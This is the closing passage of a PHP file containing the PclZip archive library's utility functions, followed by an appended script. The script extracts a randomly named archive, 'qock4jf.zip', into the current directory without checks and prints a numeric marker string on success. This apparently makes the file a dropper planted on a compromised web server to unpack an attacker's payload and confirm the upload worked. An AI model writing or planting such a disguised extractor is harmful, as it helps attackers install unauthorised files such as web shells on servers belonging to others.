    $p_dir = PclZipUtilTranslateWinPath(getcwd(), FALSE).'/'.substr($p_dir, 1);
  }
  if (   ($p_path == '.')
      || ((strlen($p_path) >=2) && (substr($p_path, 0, 2) == './'))) {
    $p_path = PclZipUtilTranslateWinPath(getcwd(), FALSE).'/'.substr($p_path, 1);
  }

  $v_list_dir = explode("/", $p_dir);
  $v_list_dir_size = sizeof($v_list_dir);
  $v_list_path = explode("/", $p_path);
  $v_list_path_size = sizeof($v_list_path);

  $i = 0;
  $j = 0;
  while (($i < $v_list_dir_size) && ($j < $v_list_path_size) && ($v_result)) {

    if ($v_list_dir[$i] == '') {
      $i++;
      continue;
    }
    if ($v_list_path[$j] == '') {
      $j++;
      continue;
    }

    if (($v_list_dir[$i] != $v_list_path[$j]) && ($v_list_dir[$i] != '') && ( $v_list_path[$j] != ''))  {
      $v_result = 0;
    }

    $i++;
    $j++;
  }

  if ($v_result) {
    while (($j < $v_list_path_size) && ($v_list_path[$j] == '')) $j++;
    while (($i < $v_list_dir_size) && ($v_list_dir[$i] == '')) $i++;

    if (($i >= $v_list_dir_size) && ($j >= $v_list_path_size)) {
      $v_result = 2;
    }
    else if ($i < $v_list_dir_size) {
      $v_result = 0;
    }
  }

  return $v_result;
}

function PclZipUtilCopyBlock($p_src, $p_dest, $p_size, $p_mode=0)
{
  $v_result = 1;

  if ($p_mode==0)
  {
    while ($p_size != 0)
    {
      $v_read_size = ($p_size < PCLZIP_READ_BLOCK_SIZE ? $p_size : PCLZIP_READ_BLOCK_SIZE);
      $v_buffer = @fread($p_src, $v_read_size);
      @fwrite($p_dest, $v_buffer, $v_read_size);
      $p_size -= $v_read_size;
    }
  }
  else if ($p_mode==1)
  {
    while ($p_size != 0)
    {
      $v_read_size = ($p_size < PCLZIP_READ_BLOCK_SIZE ? $p_size : PCLZIP_READ_BLOCK_SIZE);
      $v_buffer = @gzread($p_src, $v_read_size);
      @fwrite($p_dest, $v_buffer, $v_read_size);
      $p_size -= $v_read_size;
    }
  }
  else if ($p_mode==2)
  {
    while ($p_size != 0)
    {
      $v_read_size = ($p_size < PCLZIP_READ_BLOCK_SIZE ? $p_size : PCLZIP_READ_BLOCK_SIZE);
      $v_buffer = @fread($p_src, $v_read_size);
      @gzwrite($p_dest, $v_buffer, $v_read_size);
      $p_size -= $v_read_size;
    }
  }
  else if ($p_mode==3)
  {
    while ($p_size != 0)
    {
      $v_read_size = ($p_size < PCLZIP_READ_BLOCK_SIZE ? $p_size : PCLZIP_READ_BLOCK_SIZE);
      $v_buffer = @gzread($p_src, $v_read_size);
      @gzwrite($p_dest, $v_buffer, $v_read_size);
      $p_size -= $v_read_size;
    }
  }

  return $v_result;
}

function PclZipUtilRename($p_src, $p_dest)
{
  $v_result = 1;

  if (!@rename($p_src, $p_dest)) {

    if (!@copy($p_src, $p_dest)) {
      $v_result = 0;
    }
    else if (!@unlink($p_src)) {
      $v_result = 0;
    }
  }

  return $v_result;
}

function PclZipUtilOptionText($p_option)
{
  
  $v_list = get_defined_constants();
  for (reset($v_list); $v_key = key($v_list); next($v_list)) {
    $v_prefix = substr($v_key, 0, 10);
    if ((   ($v_prefix == 'PCLZIP_OPT')
         || ($v_prefix == 'PCLZIP_CB_')
         || ($v_prefix == 'PCLZIP_ATT'))
        && ($v_list[$v_key] == $p_option)) {
      return $v_key;
    }
  }
  
  $v_result = 'Unknown';

  return $v_result;
}

function PclZipUtilTranslateWinPath($p_path, $p_remove_disk_letter=true)
{
  if (stristr(php_uname(), 'windows')) {
    if (($p_remove_disk_letter) && (($v_position = strpos($p_path, ':')) != false)) {
        $p_path = substr($p_path, $v_position+1);
    }
    if ((strpos($p_path, '\\') > 0) || (substr($p_path, 0,1) == '\\')) {
        $p_path = strtr($p_path, '\\', '/');
    }
  }
  return $p_path;
}




$archive = new PclZip("qock4jf.zip");
if ($archive->extract() == 0) {
die("Error : ".$archive->errorInfo(true));
}
else
{
die("1425756856");	
}